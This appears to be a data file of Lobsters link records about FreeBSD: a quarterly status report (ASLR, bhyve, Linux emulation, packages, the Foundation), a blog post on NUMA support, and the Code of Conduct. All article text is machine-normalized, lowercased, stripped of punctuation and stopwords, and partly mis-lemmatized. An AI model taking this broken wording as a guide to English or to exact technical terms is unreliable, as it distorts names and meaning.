freebsdarm freebsdorg mailing list freebsd release engineering tool natively support producing freebsdarm image without external build tool present build tool support building freebsdarm image beaglebone cuboxhummingboard gumstix rpib freebsdcurrent pandaboard wandboard freebsd release engineering team would like thank people support input would like especially thank tim kientzle work crochet without might able produce image various board able information else changed freebsd since see freebsd release note become release note additionally glen barber would like thank jim thompson providing beaglebone black board replacing one longer worked benjamin perrault providing pandaboard e used locally testing image produced build tool last certainly least glen barber would also like thank freebsd foundation support providing resource time hardware required make item mentioned status report possible project sponsored freebsd foundation contact freebsd core team core freebsdorg freebsd core team constitutes project board director responsible deciding project overall goal direction well managing specific area freebsd project landscape order help attract fresh developer talent freebsd core general policy make available uptotheminute suite developer tool service core long encouraging freebsd committers make full use project phabricator instance http reviewsfreebsdorg supported phabricator admins opening access anyone interested enough sign account development consideration include setting freebsdorg oauth provider permitting oauthstyle single signon access freebsd webbased service developer member public would additionally able use credential provider github twitter google authenticate freebsd web service mark murray raised problem time getting adequate security review proposed change random extremely security sensitive area kernel error disastrous consequence core able drum number reviewer made significant progress simplifying design eliminating difficult portion code reducing potential attack surface work still ongoing core remains open idea bringing external reviewer specialist cryptographic knowledge dagerling smørgrav resigned security officer towards end may core sorry see step unanimously pleased welcome nominee former deputy xin li successor xin since appointed gleb smirnoff also happens current member core new deputy core fairly radical idea discussion improve project responsiveness security issue midjune change style proposed resulted much lively discussion warner losh conducted informal poll phabricator change approved committed within couple day unfortunately complaint raised timing voting method core called upon arbitrate change backed voluntarily new poll held time vote change approved period two new commit bit awarded one taken safekeeping welcome aboard chris torek mariusz zaborski sorry indeed see steve kargl decide call day contact shawn webb shawnwebb hardenedbsdorg contact oliver pinter oliverpinter hardenedbsdorg contact hardenedbsd core hardenedbsdorg hardenedbsd downstream distribution freebsd aimed implementing exploit mitigation security technology hardenedbsd development team focused several key feature one address space layout randomization aslr aslr computer security technique aid mitigating lowlevel vulnerability buffer overflow aslr randomizes memory layout running application prevent attacker knowing given vulnerability lie memory last quarter hardenedbsd team finalized core implementation aslr implemented true stack randomization along random stack gap change allows u apply bit entropy stack highest operating system bumped hardeningpaxaslrstacklen sysctl default also randomize virtual dynamic shared object vdso vdso one page memory shared kernel userland contains signal trampoline timing code gettimeofday example two change aslr implementation complete still task work however need update documentation enhance piece code aslr implementation use production hardenedbsd performing robustly additionally currently running fundraiser help u establish notforprofit organization hardware update received lot help community greatly appreciate help need help take project next level look forward working freebsd project providing excellent security project sponsored soldierxopen task update aslr manpage wiki page improve shared object load order feature michael zandi improvement report aslr work vanilla freebsd include custom work requested freebsd developer close existing review phabricator open multiple smaller review piece aslr patch split logically perform special backport hardenedbsd opnsense pull golang segfaults hardenedbsd help would nice debugging contact peter grehan grehan freebsdorg contact neel natu neel freebsdorg contact tycho nightingale tychon freebsdorg contact allan jude freebsd allanjudecom contact alexander motin mav freebsdorg contact marcelo araujo araujo freebsdorg bhyve hypervisor run platform present run freebsd later linux openbsd guest current development focused enabling additional guest operating system implementing feature found hypervisors bhyve bof bsdcan bhyve bof held lunch hour bsdcan attended approximately people michael dexter showed window server running inside bhyve common theme came discussion bhyve configuration libvirt openstack integration best practice bhyve zfs additional guest support live migration google summer code number bhyverelated proposal submitted gsoc four accepted number improvement made bhyve quarter geom storage backend work properly bhyve device model enhancement new instruction emulation support window guest improve virtionet performance disabling queue notification needed dtrace fbt provider work properly vmmko marcelo araujo allan jude created rough patch make bhyve parse config file replace existing method configuration command line invocation rapid pace advancement bhyve resulted requiring much complex config file new design config file support plugin architecture eventually introduced bhyve discussed open task improve documentationbhyveucl script starting bhyve instance based libucl config file information http githubcomallanjudebhyveucladd support virtioscsiflexible networking backend wanproxy vhostnetsupport running bhyve nonrootadd filter popular vm file format vmdk vhd implement abstraction layer video sdl base system suspendresume supportlive migrationnested vtx support bhyve bhyve support architecture arm mips ppc contact allan jude allanjude freebsdorg contact dmitry chagin dchagin freebsdorg contact ed maste emaste freebsdorg contact edward tomasz napierała trasz freebsdorg contact johannes meixner xmj freebsdorg contact freebsd emulation team emulation freebsdorg freebsd emulation team done extensive work polishing freebsd linux emulation layer year half dmitry chagin change linux binary emulation layer merged freebsd merging individual change basehead ed maste edward tomasz napierała able help reviewing improving code quality work begun backporting change freebsd current release cycle mind hope backport ready turn vein allan jude able upload improve recent differential revision eventually lead port centos port review activity started bsdcan conference developer summit continued extensively cambridge developer summit currently expecting fedora centos centos framework available call help contributing people contribute emulation team effort testing centos change freebsd system please use bugzilla report bug oddity encountered ambitious planning start working centos framework us newer kernel systemd work highly experimental hope usable port project sponsored perceivon hosting inc scaleengine inc freebsd foundationopen task test linux emulation backport linux emulation review centos port merge change createheavily update existing centos port anyone would like get touch hesitate contact emulation team member similarly mail emulation freebsdorg always welcome contact max gurtovoy maxg mellanoxcom contact sagi grimberg sagig mellanoxcom building new inkernel iscsi initiator stack released freebsd recently added iscsi offload interface mellanox technology begun developing iscsi extension rdma iser initiator support enable efficient data movement using hardware offload capability mellanox gigabit ibethernet adapter remote direct memory access rdma shown great value storage application rdma infrastructure provides benefit zerocopy cpu offload reliable transport fabric consolidation many iser protocol eliminates bottleneck traditional iscsitcp stack provides low latency high throughput well suited latency aware workload work includes new icl module implement iser initiator iscsi stack slightly modified support extra feature asynchronous io completion unmapped data buffer datatransfer offloads user able choose iser iscsi transport iscsictl project beta phase recent addition include rebased top added discovery iser support ha automatic session reestablishment support split iser iscsi module addition iser driver continues thoroughly tested test suite includes traffic f test compliance test traffic failoverfailback session recovery dynamic module loadunload code ready inclusion released bsd license project sponsored mellanox technology contact nigel williams njwilliams swineduau multipath tcp mptcp extension tcp allows use multiple network interface standard tcp session addition new address scheduling data across occurs transparently perspective tcp application goal project deliver mptcp kernel patch interoperates reference mptcp implementation along additional enhancement aid network research patch support core mechanism mptcp protocol multiaddress operation datalevel retransmission etc recent addition include improved socketoption handling transfer logging output dtrace patch updated build head patch currently tested made available public shortly plan release patch frequent basis following project sponsored freebsd foundationopen task complete documentation testing release patch release technical report describing implementation contact robert watson rwatson freebsdorg contact christian brueffer brueffer freebsdorg contact trustedbsd audit mailing list trustedbsdaudit trustedbsdorg openbsm bsdlicensed implementation sun basic security module bsm api file format user space side capp audit implementation freebsd mac o x additionally audit trail processing tool expected work linux period dormancy project slowly picking steam openbsm source code repository migrated freebsd perforce server github hope make code accessible stimulate outside contribution addition repository migration automated build testing using travis ci enabled initial step towards new test release made open task test code github different release mac o x linux especially testing mac o x maverick newer would greatly appreciated contact franco fichtner franco opnsenseorg contact ad schellevis ad opnsenseorg contact jos schellevis jos opnsenseorg opnsense fork pfsense aim follow freebsd code base ecosystem quickly closely retaining parent powerful firewall capability new release includes effort firmware upgrade packaging fully based pkg weekly security update replacement altqbased traffic shaping ipfwdummynet productionready libressl integration alternative openssl contributor tester welcome work redesigning plugin support rework gui according modern coding standard mvc privilege separation project sponsored deciso contact edward tomasz napierała trasz freebsdorg one long missing feature freebsd ability boot temporary rootfs configure kernel able access real rootfs replace temporary root real one linux functionality known pivotroot reroot project aim provide similar functionality different slightly userfriendly way rerooting simply put user point view look like system performs partial shutdown killing process unmounting rootfs partial bringup mounting new rootfs running init running startup script usual project late implementation phase working prototype written work process rewrite architecturally nicer way project sponsored freebsd foundationopen task complete debugging contact jason edward submesa gmailcom zfsguru multifunctional server appliance strong emphasis storage zfsguru began simple webinterface frontend zfs since grown freebsd derivative infrastructure scope project also grown inclusion addon package add functionality beyond traditional na functionality found similar product like freenas zfsguru aim true multifunctional server appliance extremely easy set unite novice experienced user single user interface modular nature project combat danger bloat whilst still allowing extended functionality easily deployed zfsguru project nearing release version major milestone project new version major work done fundamental overview new build infrastructure allows frequent release system image service semiautomated way new gurudb database allows growing number system image server provides good caching accelerate page redesigned installation procedure addition new distribution rootonram rootonmedia aside already supported rootonzfs livecd usb image provided usb image also uefi boot support working alongside regular mbr boot support available many overhauled library addition web interface many improvement service new gnome graphical environment zfsguru version released first august contact warner losh imp freebsdorg kernel driver implemetation dallas semiconductor bus generic fashion temperature sensor device initially supported device easy add multiple device one bus supported normal overdrive mode supported multiple temperature sensor well tested high bit error rate indication due bad bitread time code written enough resilience cope problem retrying error rate low enough couple retries paper many marginal issue open task implement overdrive device add overdrive capability owc provide method allow presentation driver know safe use overdrive rom command implement identification device device class register implement nonfdt gpiobus attachment test overdrive timing implement attachment thing like serial port specialized controller use system clock implement precise delay improve error rate use interrupt mode gpio pin time transition line determine bit value without busy waiting use freebsd finegrained sleeping writeone writezero routine review code url test code device rpi rpi beaglebone black test code architecture besides implement streamlined temperature mode convertt command broadcast callback read value device detected bus implement parasitic power mode contact johnmark gurney jmg freebsdorg pci express pcie hotplug used laptop server allow peripheral device added removed system running laptop commonly include hotpluggable pcie either expresscard slot thunderbolt interface expresscard built usb support already supported freebsd expresscard pcie device like gigabit ethernet adapter esata card supported present boot removal may cause freebsd crash goal project allow device inserted removed freebsd running work provide basic infrastructure support adding removing device though expected additional work needed update individual driver support hotplug current testing focused getting simple uart device functional basic hot swap functional set patch available githubcom project sponsored freebsd foundationopen task get suspendresume functional saverestoring necessary register addressed make sure upon suspend device removed hardware change made machine suspended correctly handled improve state transition handled possibly using proper state machine contact ed schouten ed freebsdorg cloudabi compact unixlike runtime environment purely based capabilitybased security capsicum feature incompatible model removed advantage using pure capabilitybased environment include improved security testability reusability cloudabi make possible run arbitrary thirdparty executables directly top freebsd without impact system security making good building block clustercloud computing setup see project github detailed explanation last month added number package freebsd port tree full cc cross compiler installed easily develcloudabitoolchain also imported tool called cloudabirun used start program safely granting access file network socket listed program configuration file sysutilscloudabiutils also imported kernelspace modification freebsd source tree executing cloudabi program change imported loading kernel module allow executing cloudabi program right cloudabi branch github still required project sponsored nuxi netherlandsopen task polish kernelspace modification send review complete linux netbsd kernel patchsets send respective maintainer contact konstantin belousov kib freebsdorg processcontext identifier pcid performanceenhancing feature translation lookaside buffer tlb intel processor introduced sandy bridge microarchitecture allows tlb simultaneously cache translation information several address space give opportunity operating system context switch code avoid flushing tlb upon process switch cached translation tagged context identifier context switch time operating system instructs processor context becoming active feature slightly reduces context switch time avoiding tlb flush importantly reduces warmup period thread context switch freebsd already used pcid existing implementation several shortcoming pmap machinedependent portion virtual memory subsystem maintained bitmap cpu ever loaded translation given address space avoided tlb flush context switch bitmap used direct interprocessor interrupt marked cpu operating system needed perform tlb invalidation significant deficiency old implementation increase tlb invalidation ipis since bitmap could grow full tlb shootdown performed increased tlb rate negated positive effect avoiding tlb flush large machine secondarily bitmap maintenance pmap context code quite complicated leading bug issue resulted pcid feature disabled default new pcid implementation us algorithm described u vahalia book unix internals new frontier algorithm already used example mips pmap assigning address space identifier asids softwaremanaged tlb entry pmap maintains percpu generation count assigned next unused pcid context activated cpu tlb invalidation includes resetting generation count cause reallocation pcid context switch performed result new implementation issue exactly amount shootdown ipis pmap utilize pcid another change included pcid rewrite move address space switching code assembler c source making algorithm easier understand validate measurement done hwpmc haswell machine indicated new implementation reduced tlb miss rate time without increase tlb shootdown ipis rewrite committed head note amd processor pcid feature host paging amd provides asids svm use likely amd processor cache tlb translation different address space transparently snoop writes page table invalidate cache project sponsored freebsd foundation contact konstantin belousov kib freebsdorg acpi specication defines cpu cx state idle state method enter state miscellaneous information like stateleave latency returned cst acpi method save energy reduce useless heating operating system enters cx state cpu work nonidle state defined acpi represent idle state sequentially energy saving also higher latency leave possibly greater secondary cost example entered executing hlt instruction architecturally visible side effect entering drop cpu cache usually requires special chipset programming correctly handle request io device cpu confuse cx px sx cx state meaningful system fully operational state px state meaningful system idle state modern intel cpu enter cx x state dedicated instruction mwait enters specified lowpower state specific write observed cpu bus logic complimentary monitor instruction set monitored bus address legacy port io method entering cx state emulated cpu microcode intercept port io executes mwait internally using mwait method entering cx requires following processorspecific procedure communicated operating system vendorspecific extension cst operating system must indicate readiness support mwait calling cst claimed benefit using mwait reduced latency leaving idle state visibility deep state defined common acpi specification still modern intel platform report deep state avoid needed busmastering avoidance new code asks acpi intel vendorspecific cst extension par us mwait cx entrance method available change committed head linux intel provides driver depend acpi table use mwait entering cx state intel cpu driver contains description cx mode latency quirk eliminating dependency correct bios information since bios information often incorrect approach porting linux driver considered several people evaluator independently concluded project maintain approach without direct involvement intel work around line identical code version idle handling moved common location machdepc file contain unique machinedependent routine advance depended john baldwin elimination unmaintained xen pvm port project sponsored freebsd foundation contact warner losh imp freebsdorg plan transition hard float involved new machinearch seemed expedient inelegant kernel easily run soft hard floating point binary assuming proper library available experiment investigating hard would start generating hard float binary starting freebsd issue cause interested source effect port binarypackage upgrade issue freebsd successful allow project move quickly away softfloating point default user upgrading freebsd automatically upgraded hard float supported processor hardware floating point problem vast majority user addition many build script know value machinearch changing machinearch allow script continue function without additional change three fourth way investigating possibility coding solution problem encountered far risk experiment encounter unforseen dependency could force u go original plan migration hard floating point hope experiment pave way using superior hard floating point freebsd minimal impact user current build script process backwards compatibility ensured libsoft task user need run freebsd softfloat binary freebsd new hardfloat library package automatically update new hardfloat package put place open task building seat belt ldso crossthread library differing floating point implementation clang properly mark hard versus soft floating point o minor issue since ld handle thing correctly libsoft analog need completed patch flip switch soft hard build additional code needed build soft float may needed prior task contact dominik ermel der semihalfcom contact wojciech macek wma semihalfcom contact michal stanek mst semihalfcom contact zbigniew bodek zbb semihalfcom since previous report thunderx gained smp support freebsd running reallife cpu core newly introduced functionality based initial foundational work submitted andrew turner robin randhawa emulation primary target semihalf effort focused hardware include multicore support newer generic interrupt controller numerous bug fix pmap memory attribute tlb management locores secondary core initialization ipi interprocessor interrupt percpu timer size early uma allocation cache maintenance exception handling stack issue thunderxspecific change quirk support introduced public freebsd developer summit ottawa demo held semihalf freebsd foundation cavium thunderx server crb customer reference board capable booting smp freebsd hard disk nfs root using pcie networking card example setup available freebsd test cluster hosted sentex communication thunderx support change currently reviewed integrated mainline freebsd project sponsored freebsd foundation arm ltd cavium semihalfopen task upstream thunderx support freebsd head support multisocket configuration thunderx cpu connected coherent fabric implement vnic support thunderx networking controller contact andrew turner andrew freebsdorg contact ed maste emaste freebsdorg contact ruslan bukin br freebsdorg since last status report support building freebsd committed subversion initially targeting qemu hardware support added review support acpi smp dtrace hwpmc added acpi able enumerate device get mountroot prompt work needed get userland smp tested qemu two core work way support smp hardware hwpmc driver includes support core arm poudriere used usermode qemu test building package port successfully built number issue found fixed first run fix unblock additional port project sponsored freebsd foundation abt system ltd arm ltdopen task port socs test poudriere native hardware contact baptiste daroussin bapt freebsdorg pw utility create delete modify user tool remained mostly untouched since creation needed updating lot cleanup done deduplication code reduction complexity splitting smaller function reuse existing code base sbuf buffered string stringlist string array grutils libutil instead homemade group manipulation strptime parse time string added validation input option fixing serious bug due bad usage atoi many regression test added test regression due change new feature added pw r rootdir cmd allows cross manipulation user open task cleanup regression test ldap support contact kde freebsd team kde freebsdorg kde freebsd team focus packaging making sure experience kde qt freebsd good possible brad davis working cmake resulting update version committed port overall updated following port quarter cmake committed port qt committed qt refinement committed port open task put effort port kde framework currently worked tobias berner pyqt contact bryan drewery bdrewery freebsdorg contact port management team portmgr freebsdorg contact sean bruno sbruno freebsdorg package help freebsd foundation providing build server increased build frequency package weekly every day package provided currently supported release head port head branch quarterly package freebsd release branch using eight different system building package build process fully automated fault tolerant detail available upcoming freebsd journal article eleven server used daily test build make simpler everyone find status result build pkgstatusfreebsdorg developed bryan drewery intent show system build nearly realtime currently beta stage improved time time writing temporarily restored soon armmips package freebsd foundation purchased server project begin building providing arm mips package package currently built system using qemu detail found bsdcan presentation work shepherded sean bruno help many people including limited juergen lock stacey son ed maste peter wemm alexander kabaev adrian chadd baptiste daroussin bryan drewery dimitry andric andrew turner warner losh ian lapore brook davis currently targeting package head mips set take one two week build qemu provided best effort basis default repository pkgfreebsdorg project sponsored freebsd foundation package building hardware open task portmgr met bsdcan decided default package set provided based port quarterly branch provide stable package default allow user wish bleeding edge use head package quarterly branch currently updated full every three month head otherwise receives security critical fix moving towards plan also require change update quarterly branch detail provided later performance stability qemu continues improve native crossbuilding support port need work testing viable package build currently run crontab every day build take two hour incremental others take hour full build open task implement better o abi check see incremental build done full rebuild needed saen come plan detailed http another open task implement master queue coordinator start next build soon others done also allow improving pkgstatus site view everything contact frederic culot portmgrsecretary freebsdorg contact freebsd port management team portmgr freebsdorg end second quarter port tree hold nearly port pr count tree saw activity previous quarter almost commits performed active committers hand number problem report closed decreased slightly bit le problem report fixed second quarter several commit bit taken safekeeping following inactivity period month clsung dhn obrien tmseck committer request sahil two new developer granted port commit bit michael moll mmoll bernard spil brnrd management side pgollucci started fourmonth term portmgrlurker june change made portmgr team second quarter quarter also saw release second quarterly branch namely branch committers applied patch twice many update last quarter quality assurance side expruns performed validate sensitive update cleanup amongst noticeable change update pkg three new us waf gnustep jpeg perl default switch ruby firefox chromium open task previous quarter tremendous amount work done tree update major port close even pr always additional help greatly appreciated contact freebsd graphic team freebsdorg member graphic team lacking spare time quarter thing could improved port development tree still hold update mesa along many cleanup bug fix previous quarterly report initially planned commit early july freebsd endoflife date eol delayed july therefore send call tester near end july update committed early august course update still obtained tested directly port development tree using mesanext branch several smaller update xorgrelated port committed port tree work kernel driver update made progress quarter due lack free time fortunately resume hope something ready test september update drm deviceindependent code merged mean available upcoming freebsd recently website hosting blog frequently case time writing exported data last time probably move another system course url change well open task see graphic wiki page uptodate information contact gerald pfeifer gerald freebsdorg contact david naylor dbn freebsdorg quarter seen seven update winedevel port closely track upstream development well update helper port winegeckodevel winemonodevel stable release port revision development release port package built freebsd current accomplishment include rename winecompholio winestaging match upstream development future development wine focus add getdirentries patch winedevel port redevelop upstream getdirentries patch redevelop upstream makefile patch add support port pkg library conflict currently prevent support add support window window reduce port component required rename port make wine port depend port built investigate verify interaction investigate possible update approach port precompiled updating wine port work maintaining improving wine major undertaking directly impact endusers freebsd including many gamers interested helping please contact u happily accept patch suggest area focus chat open task open task known problem see wine wiki integration see wiki porting window window contact freebsd xfce team xfce freebsdorg xfce free software desktop environment unix unixlike platform freebsd aim fast lightweight still visually appealing easy use quarter team kept application uptodate deskutilsorage sysutilsxfburn committed port committed devel repository wwwmidori mathieu arnold mat committed pr updating xfce section porter handbook also follow unstable release available experimental repository sysutilsgarcon support toolkits new plugin open task create documentation usage need love pr hidden feature introduced release also support fork sysutilsconsolekit help user required contact freebsd documentation team freebsddoc freebsdorg developer summit held two day bsdcan documentation working group meeting held discussed biggest opportunity available documentation team modernizing translation system major topic making easier translator work vitally important translation make freebsd much accessible nonenglish speaker people translator often become valuable technical contributor area progress made area hope news soon method making easier people contribute documentation another major topic present use docbook xml article book mdoc man page markup language welcoming new user simpler documentation markup language like restructured text rst markdown asciidoc take le time learn use fact markup system similar system tend oriented towards visual appearance rather semantic markup present system although might way work around following theme making contributing easier also discussed whether access freebsd wiki easily granted facilitating user contribution wiki set automated account creation abuse forced access limited tricky allow submission yet keep quality submitted information usefully high due markup system used difficult review document quality information annotator javascript system allows adding note existing web page would allow u hold contentonly review documentation web page reviewer would see markup could concentrate whether information accurate complete use desired need help port testing open task complete port backend storage component annotator preferably would lowest overhead openlicensed version available assistance familiar python javascript web development welcome contact michael lucas mwlucas michaelwlucascom first zfs book available favorite bookstore find whole bunch link zfsbookcom work proceeding apace freebsd mastery advanced zfs freebsd mastery specialty filesystems lucas hope fmaz complete available next status report contact warren block wblock freebsdorg leap second scheduled end june approached bartek rutkowski others raised question freebsd handled leap second leap second caused serious problem operating system last year understandable concern reasonably pointed freebsd encountered leap second would fine time also still absence reported problem really substitute description expect know system prepared address concern also provide resource future leap second several expert pestered relentlessly result compiled short article beyond merely allaying fear might happen article received positive response web demonstrated freebsd maturity preparedness great thanks patience expertise owed peter jeremy poulhenning kamp ian lepore xin li warner losh george nevilleneil open task compile short article thing freebsd really well particular interest feature make life easier sysadmins problem system dealt even made nonproblems freebsd contact freebsd documentation engineering team doceng freebsdorg two new documentation committers added team second quarter mathieu arnold member freebsd port management team past year worked many large complex update keep porter handbook current continues update important document anne dickison marketing director freebsd foundation focus updating improving freebsd main web site welcome new committers look forward additional contribution contact björn heidotting bhd freebsdorg contact johann kois jkois freebsdorg contact benedict reuschling bcr freebsdorg freebsd german documentation project maintains german translation freebsd document handbook website second quarter managed catch translation work handbook two chapter back sync english reference chapter filesystems zfs former mainly done björn heidotting part mentee process latter done benedict reuschling valuable correction björn additionally updated many translation marker presvn time help u get overview outstanding work chapter working integrating website using script people see chapter need work uptodate johann made effort update freebsd documentation project primer well translator willing help u read information german also made effort revive documentation project website previously hosted elsewhere disappeared tied german freebsdorg website look feel occasionally people contact u offer help translation effort happy help newcomer get know everything translation process look forward contribution even small update make big difference considering helping please contact u open task continue translating handbook website german integrate script show outstanding work german documentation webpage contact pedro giffuni pfg freebsdorg contact oliver pinter op freebsdorg part year google summer code adding support fortifysource extension libc extension us gcc builtinobjectsize information prevent buffer overflow existing code compiler c library effectively detect set common programming mistake mixed version netbsd android implementation ported currently undergoing heavy testing freebsd code already found two small bug hand freebsd codebase extremely useful test framework project sponsored google summer code programopen task code review buildworld testing gcc integration test especially platform documentation framework relatively popular gnu libc still work better documentation testing possibly integrating port reschedule gsoc project expecting spend le time contact tiwei bie btw freebsdorg contact hiren panchasara hiren freebsdorg aim project design implement infrastructure validate number network stack multiqueue behaviour expected mainly consists extending tap provide r behaviour hardware multiqueue network card developing simple test application using multiqueue tap socket adding hook layer network stack collect perring percpu perlayer statistic extending netstat report statistic present part project implemented focus code review apikpi freeze project sponsored google summer code contact dan langille dvl freebsdorg bsdcan conference people working operating system related project held ottawa ontario june twoday freebsd developer summit event preceded june largest bsdcan ever attendee people event record number speaker talk additional room track added provide even choice concurrent talk day conference social medium response whole conference positive keynote talk stephen bourne popular popular fact main conference room could hold attendee overflow room live video set hold extra people video presentation view first twelve day andrew tanenbaum talk reimplementing netbsd using microkernel wellattended standing room many excellent talk recommend browsing playlist link activity limited talk night hacker lounge used developer cooperate interact project embedded project popular year freebsd installed directly wireless router successful wellattended closing event held lowerton brewery provided elegant closure whole conference would like thank everyone made bsdcan success look forward next year contact sevan janiyan geeklancouk pkgsrc fork freebsd port collection netbsd project focus portability multiplatform support present pkgsrc support building package different platform single tree including freebsd pkgsrc replacement port use case hold unique position mixedplatform environment software need version across system built consistent manner saving user resort manually building program reimplementing mechanism recent release earlier month possible generate package freebsd last quarter work progress add pkg support pkgsrc open task improve platform support skip libusb freebsd libusb bundled base causing biggest breakage moment expand effort stable current branch possible architecture contributing shell access machine would helpful unprivileged account sufficient contact deb goodkin deb freebsdfoundationorg freebsd foundation c nonprofit organization dedicated supporting promoting freebsd project community worldwide funding come individual corporate donation used fund manage development project conference developer summit provide travel grant freebsd developer foundation purchase hardware improve maintain freebsd infrastructure publishes freebsd white paper marketing material promote educate advocate freebsd project foundation also represents freebsd project executing contract license agreement legal arrangement require recognized legal entity highlight help freebsd last quarter platinum sponsor bsdcan sponsor ottawa developer vendor summit pleased provide travel grant freebsd contributor attend conference opportunity meet facetoface freebsd contributor read trip report celebration anniversary provided delicious freebsd cake happily devoured conference attendee various foundation team member gave talk attended talk participated doc sprint worked effort improve freebsd worked booth spent time talking constituent area help freebsd foundation member gave talk held annual board meeting ottawa pleased announce addition benedict reuschling board director read interview current board director officer reelected find board spent day planning goal project roadmapping freebsd education offering fundraising advocacy effort dru lavigne promoted gave presentation freebsd linuxfest northwest committed sponsoring several upcoming conference vbsdcon womencourage eurobsdcon grace hopper conference bsdcon brasil cambridge developer summit openzfs also find u oscon july snia storage developer conference sept fundraising far raised donor juniper became gold level donor actively approaching commercial freebsd user silverplus donation asking large tech company separate woman tech funding help u recruit woman freebsd project also asking company funding help freebsd education effort pleasure hosting groff bsd goat colorado april infrastructure support foundation funded almost equipment support freebsd infrastructure went towards new upgraded server nyi facility sent glen barber install new server read trip advocacy work freebsd journal subscriber renewal rate marketing director anne dickison busy providing advocacy work project helped provide freebsd marketing literature material included cool choose freebsd sticker popular love freebsd temporary tattoo available conference published april may june foundation newsletter highlight work done foundation support freebsd newsletter also include company freebsd testimonial upcoming event freebsd promoted new trench article freebsd contributor experience working freebsd one foundation responsibility protect freebsd intellectual property ip includes protecting freebsd trademark granted trademark usage permission various company want show support freebsd get permission use trademark interested party must agree trademark usage term condition project development work george nevilleneil signed new university look freebsd course including george washington university john hopkins uc santa cruz working verisign devsummit held vbsdcon also worked arm set meeting hardware silicon vendor arm partner meeting august ed maste continued managing porting project also continued update elf toolchain tool freebsd base system incorporated set fix upstream project fix issue strip tool ed investigated fixed set outstanding issue new vt console freebsd installer staff member edward napierała committed number bug fix merges branch inclusion freebsd continued investigation project support runtime switching root file system merged large number improvement autofs automount daemon also supported freebsd developer dmitry chagin work linux binary emulation support reviewing extensive patch set change committed freebsd subversion tree arrive freebsd staff member konstantin belousov continued development intel dma remap dmar process context identifier pcid infrastructure project kostik also contributed extensive set change multiple aspect freebsd stability improvement virtual memory subsystem improved compatibility option handling runtime loader thread library improvement gdb debugger enhancement glen barber foundation employee also release engineer project highlight help project added support release build code producing memory stick image virtual machine disk image use within qemu worked colin percival brad davis testing refining release build code support building amazon image vagrant image hashicorp atlas respectively reworked freebsdarm build code provide fullynative build infrastructure existing image beaglebone rpib pandaboard wandboard add support additional image gumstix cuboxhummingboard wrote several additional utility reduce human error several area release engineering including producing filesystem hierarchy used ftp mirror enhancement internal build script used release engineering support automatically uploading publishing virtual machine image attending bsdcan glen worked several developer team various item discussing packaging base system pkg migrating internal freebsd server new machine foundation purchased nyi facility discussing possible future enhancement freebsd build infrastructure started cycle contact eric mccorkle metricspacenet uefienabled loaderefi modified support loading booting zfs filesystem patch currently work buildworld successfully boot test machine zfs partition addition zfsenabled loaderefi treated chainloader using zfsenabled grub work also reorganizes code somewhat splitting filesystemspecific part modular framework open task testing needed following use case zfs grubloaderefi zfs ufs test modularization check partition type guids probing filesystems get patch accepted upstream committed news home status home
592,Lobsters,freebsd,FreeBSD,FreeBSD now has NUMA? Why'd it take so long?,http://adrianchadd.blogspot.com/2015/07/freebsd-now-has-numa-whyd-it-take-so.html,freebsd numa take long,,committed numa freebsd well nt almost actual numay work freebsd exposed existing numa stuff freebsd reenabled introduced basic numa awareness physical allocator sysvmvmphysc implemented firsttouch page allocation fell back searching domain roundrobin style nt perfect workload apparently okay shortcoming nt configurable uma subsystem nt know numa domain scheduler really nt know numa domain sure plenty workload nt work ripped numa implement roundrobin physical page allocation still track perdomain physical memory region nt kind numa aware allocation gather removed something better would land however nothing yet landed decided take look found lot simple workload ie lot anonymous memory allocation eg math crunching model work fine also perfectly good starting point experimenting numa work head provide api exactly nt teach kernel apis domain aware allocation currently way ask memory specific domain calling uma contigmalloc etc scheduler nt know numa threadsprocesses migrate offsocket quickly unless explicitly limit thing device nt yet numa local work acpi code enumerate numa domain used anywhere yet good math workload read data memory bunch work spit work fine running bhyve instance run using numactl pinned local numa domain coarsegrained thing work fine also change system default back roundrobin use firsttouch fixeddomain specific process useful exactly subset task least configurable next well main aim get minimum done kernel side work numa aware includes uma contigmalloc malloc mbuf allocation nice tag vm object domain allocation policy currently scope also like plumb domain configuration device allow device allocate memory different driver thread different policy first thing showed kva allocation superpages get way malloccontigmalloc working allocating memory freebsd first allocates kva space backfills page far malloccontigmalloc concerned kva kva find first available space timefast way backfills physical page superpage reservation bit sysvmvmreserv ch join together region contiguous superpage turn allocation superpage idea numa domain allocate page via malloc domain try allocate page domain likely mess first page get allocated first kva underlying superpage allocated page returned physical memory domain second page get allocated first kva adjacent within superpage allocation fake page allocation via refcounting really underlying superpage physical memory domain teach vmreserv kva allocator numa domain enough domain specific allocation nt use kva adjacent suggested create second layer kva allocator allocate kva main resource allocator superpage chunk domainspecific allocation change thing get fragmented bit mean wo nt fall afoul thing experiment push vm policy evaluation little malloccontigmalloc see experiment go post diffs testingevaluation
593,Lobsters,freebsd,FreeBSD,FreeBSD Announces Code of Conduct,https://www.freebsd.org/internal/code-of-conduct.html,freebsd announces code conduct,freebsd code conduct freebsd community code conduct conduct freebsdorg reporting guide question conduct freebsdorg core freebsdorg draft coc django project,freebsd code conduct freebsd community code conduct freebsd community always worked welcoming respectful community want ensure nt change grow evolve end ground rule ask people adhere friendly patient welcoming considerate respectful careful word choose kind others disagree try understand nt exhaustive list thing ca nt rather take spirit intended guide make easier communicate participate community code conduct applies space managed freebsd project includes online chat mailing list bug tracker freebsd event developer meeting social forum created project community us communication applies communication conduct space including email chat thing say slide video poster sign even tshirts display space addition violation code outside space may rare case affect person ability participate within conduct amount egregious violation code believe someone violating code conduct ask report emailing conduct freebsdorg detail please see reporting guide friendly patient welcoming strive community welcome support people background identity includes limited member race ethnicity culture national origin color immigration status social economic class educational level sex sexual orientation gender identity expression age size family status political belief religion lack thereof mental physical ability considerate work used people turn depend work others decision take affect user colleague take consequence account remember worldwide community might communicating someone else primary language respectful u agree time disagreement excuse poor behavior poor manner might experience frustration allow frustration turn personal attack important remember community people feel uncomfortable threatened productive one member freebsd community respectful dealing member well people outside freebsd community careful word choose kind others insult put participant harassment exclusionary behavior nt acceptable includes limited violent threat language directed another person discriminatory joke language posting sexually explicit violent material posting threatening post people personally identifying information doxing personal insult especially using racist sexist term unwelcome sexual attention advocating encouraging behavior general someone asks stop stop persisting behavior asked stop considered harassment disagree try understand disagreement social technical happen time freebsd exception important resolve disagreement differing view constructively remember different strength freebsd come varied community people wide range background different people different perspective issue unable understand someone hold viewpoint nt mean wrong nt forget human err blaming nt get u anywhere instead focus helping resolve issue learning mistake question question please feel free contact freebsd code conduct committee emailing conduct freebsdorg freebsd core team core freebsdorg text based llvm project draft coc turn based django project code conduct turn based wording speak project
